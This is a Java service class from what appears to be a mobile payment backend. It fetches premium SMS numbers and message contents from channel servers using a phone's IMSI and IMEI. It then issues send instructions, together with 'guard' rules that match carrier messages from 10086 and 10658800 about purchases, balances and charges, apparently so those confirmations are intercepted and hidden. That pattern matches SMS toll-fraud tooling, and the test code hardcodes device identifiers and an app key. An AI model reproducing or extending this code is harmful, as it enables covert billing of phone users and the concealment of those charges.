package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.appclient.utils.XmlUtils;

/**
 * GET访问： http://cc.channel.3gshow.cn/common/req.ashx?imsi=460000000000000&imei=86000000000000&mb=13800000000&cid=151&orderId=1234&pid=1113&payCodeID=5255&responseType=xml
得到返回结果：
<?xml version="1.0"?>
<Reponse>
<Status>1000</Status>
<Pay>
<SMS>
<Num>1065800810155979</Num>
<Content>020#151_1234_35#20141009#95979693424</Content>
</SMS>
</Pay>
</Reponse>
 * @author leoliu
 *
 */
public class ZztSmmDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(ZztSmmDynamicService.class);
	
	private static final String TYPE = "zztSmm";
	
	private static final String URLPARAM1 = "imsi={imsi}&imei={imei}&mb=13800000000&cid={cid}&orderId={orderId}&pid={pid}&payCodeID={payCodeID}&responseType=xml";
	
	private static final String URLPARAM2 = "appKey={appKey}&imei={imei}&imsi={imsi}&code={code}&sid={sid}&os=4.2.1&model=2013022";
	
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	@Override
	public String dynamic(Map<String, String> map) {
	
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private String firstDynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String orderId = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(orderId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(orderId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(orderId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			String param = URLPARAM1.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			param = param.replace("{imei}", imei);
			
			String len = map.get("length");
			
			if(len != null && len.length() > 0){
				orderId = orderId.substring(orderId.length() - Integer.parseInt(len));
			}
			
			param = param.replace("{orderId}", orderId);
			param = param.replace("{cid}", StringUtils.defaultString(map.get("cid")));
			param = param.replace("{pid}", StringUtils.defaultString(map.get("pid")));
			param = param.replace("{payCodeID}", StringUtils.defaultString(map.get("payCodeID")));
			
			String responseXml = GetData.getData(url+"?"+param);
//	System.out.println(responseXml);		
			if(responseXml != null && responseXml.length() > 0){
				xml = parseXml(map,responseXml);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String xml){
		
		try {
			String status = XmlUtils.getNodeValue(xml, "Status");
			
			if("1000".equals(status)){
				List<String> arr = XmlUtils.getNodeValues(xml, "SMS");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				String sid = null;
				
				for(String s : arr){
					Sms sms = new Sms();
					
					String content = XmlUtils.getNodeValue(s, "Content");
					
					content = content.replace("&lt;","<").replace("&gt;", ">");
					
					sms.setSmsContent(content);
					sms.setSmsDest(XmlUtils.getNodeValue(s, "Num"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					if(sid == null){
						sid = fetchSid(content);
					}
				}
				
				Sms guardSms = new Sms();
							
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
						
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
				tryMap.remove(map.get("orderId"));
				
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue(sid);
				
				return XstreamHelper.toXml(smsList)+XstreamHelper.toXml(sets);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		tryMap.remove(map.get("orderId"));
		return DynamicUtils.parseError("597");
	}
	
	private String secondDynamic(Map<String, String> map){
		String xml = null;
		String url = map.get("url");
		
		String sid = map.get("sid");
		
		if(url != null && url.length() > 0){
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(sid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(sid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(sid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String appKey = map.get("appKey");
			String code = map.get("code");
			
			String param = URLPARAM2.replace("{imsi}", imsi).replace("{imei}", imei).replace("{appKey}",appKey).replace("{code}", code).replace("{sid}",sid);
			
			String responseXml = GetData.getData(url, param);
			
			xml = parseXml2(responseXml);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(7,map);
		}
		
		return xml;
	}
	
	private String parseXml2(String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			String error_code = SingleXmlUtil.getNodeValue(responseXml, "error_code");
			
			if("0".equals(error_code)){
				return "<wait>1</wait>";
			}
		}
		
		return null;
	}
	
	private static String fetchSid(String content){
		
		if(content != null && content.length() > 0){
			int pos0 = content.lastIndexOf("#");
			
			String aa = content.substring(0,pos0);
			
			pos0 = aa.lastIndexOf("#");
			
			return aa.substring(pos0+1);
		}
		
		return null;
	}

	public static void main(String[] args){
		
		test2();
		
//		System.out.println(fetchSid("MM#WLAN#KjGDL0HmLvO27awoEZxqQw==#1022273555#399900003000"));
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://cc.channel.3gshow.cn/common/req.ashx");
		map.put("imei","869460011612203");
		map.put("imsi","460028174282753");
		map.put("channel","1773263599466");
		map.put("cid","151");
		map.put("pid","1341");
		map.put("payCodeID","6571");
		map.put("theNo", "1");
		
		System.out.println(new ZztSmmDynamicService().dynamic(map));
	}
	
	private static void test2(){
//		http://pay.gzmtx.cn:8080/mm?appKey=B7AC82DB6B07FB1D3878E8DA68B8F736&imsi=460028174282753&imei=869460011612203&code=30000870542102&os=4.2.1&model=2013022&sid=294159264
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://pay.gzmtx.cn:8080/mm");
		map.put("imei","869460011612203");
		map.put("imsi","460028174282753");
		map.put("appKey","B7AC82DB6B07FB1D3878E8DA68B8F736");
		map.put("code","30000870542101");
		map.put("sid","294159266");
		map.put("theNo", "2");
		
		System.out.println(new ZztSmmDynamicService().dynamic(map));
	}
	
}
